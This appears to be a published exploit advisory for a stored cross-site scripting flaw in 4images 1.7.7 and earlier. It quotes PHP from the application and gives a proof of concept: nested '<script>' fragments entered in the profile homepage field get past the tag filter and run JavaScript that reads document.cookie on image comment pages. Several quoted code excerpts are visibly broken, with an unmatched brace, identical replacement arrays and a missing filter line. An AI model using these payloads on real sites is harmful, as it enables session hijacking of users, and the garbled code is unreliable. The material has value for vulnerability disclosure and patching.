4images <= 1.7.7 Filter Bypass HTML Injection/XSS Vulnerability
===============================================================


=By: 	Qabandi

	From Kuwait, PEACE...

=Vuln:		4images <= 1.7.7 - filter bypass HTML injection/XSS
=INFO:		~~~
=BUY:  		~~~
=DORK:  	~~~

                             _-=/:Conditions:\=-_
---------------------------------------------------------------------------------
; Magic quotes for incoming GET/POST/Cookie data.
magic_quotes_gpc = Off

Comments allowed[+]
Registration[+]

Works on default 4images comments settings. 

XSS used works with latest FireFox browser, you can use your own code.
--------------------------------------=_=---------------------------------------

                            _-=/:Vulnerable_Code:\=-_
---------------------------------------------------------------------------------
in "./4images/details.php" we see::--//First-Mistake//--

380::        $comment_user_homepage = (isset($comment_row[$i][$user_table_fields[&#039;user_homepage&#039;]])) ? format_url($comment_row[$i][$user_table_fields[&#039;user_homepage&#039;]]) : "";
381::        if (!empty($comment_user_homepage)) {

//as you can see, it just grabs whatever is in the SQL database and adds it, puts it thru format_url()
//which is nothing and relies on the filter when creating or editing USER_HOMEPAGE
//lets take a look what happends when updating user_homepage

in "./4images/member.php":://this what happends when UPDATING user_homepage thru the profile page

1053::        $user_homepage = (isset($HTTP_POST_VARS[&#039;user_homepage&#039;])) ? format_url(un_htmlspecialchars(trim($HTTP_POST_VARS[&#039;user_homepage&#039;]))) : "";

//user_homepage goes thru THREE functions, lets see what they do..
//format_url();

function format_url($url) {
  if (empty($url)) {
    return &#039;&#039;;
  }

    $url = "http://".$url;
  }

  return $url;
}
///ok cool makes sure the URL is cool

//trim() <-- built in PHP function

//un_htmlspecialchars();

function un_htmlspecialchars($text) {
  $text = str_replace(
    array(&#039;<&#039;, &#039;>&#039;, &#039;"&#039;, &#039;&&#039;),
    array(&#039;<&#039;,    &#039;>&#039;,    &#039;"&#039;,      &#039;&&#039;),
    $text
  );

  return $text;
}

//interesting but im afraid this is another mistake Q_Q

//anyway, point is the XSS filter in GLOBAL.PHP can be bypassed
// Lets take a small look at what the script does with all vars

in "./4images/global.php"::

181::  // Remove really unwanted tags
182::  do {
183::    $oldstring = $string;
185::  } while ($oldstring != $string);
186::
187::  return $string;
188:: }

//Can be bypassed..
// since it looks for <script> and replaces it with nothing, we can use the old <scr<script>ipt> method
// but a bit more advanced.
---------------------------------------=_=--------------------------------------

                                 _-=/:P.o.C:\=-_
---------------------------------------------------------------------------------

all we need is a user account, so register then go to your edit profile:
( ./4images/member.php?action=editprofile )

at the HOMEPAGE input box, type the following:

http://www.dummy.com/"><script>alert(&#039;qabandi&#039;)</script>

The script will convert it to : 

http://www.dummy.com/">alert(&#039;qabandi&#039;)

now type this :)

http://"><body<script> <script>on<script>loa<script>d="javascript:alert(document.cookie);qabandi" />

Result after SAVE:

http://"><body onload="javascript:alert(document.cookie);qabandi" />

BAAM!

go to any picture like ( ./4images/details.php?image_id=1 )

post a comment, refresh, and javascript will be executed.



now this is good because this shows that you can bypass their filter, what else can you do other than xss i wonder?

---------------------------------------=_=--------------------------------------



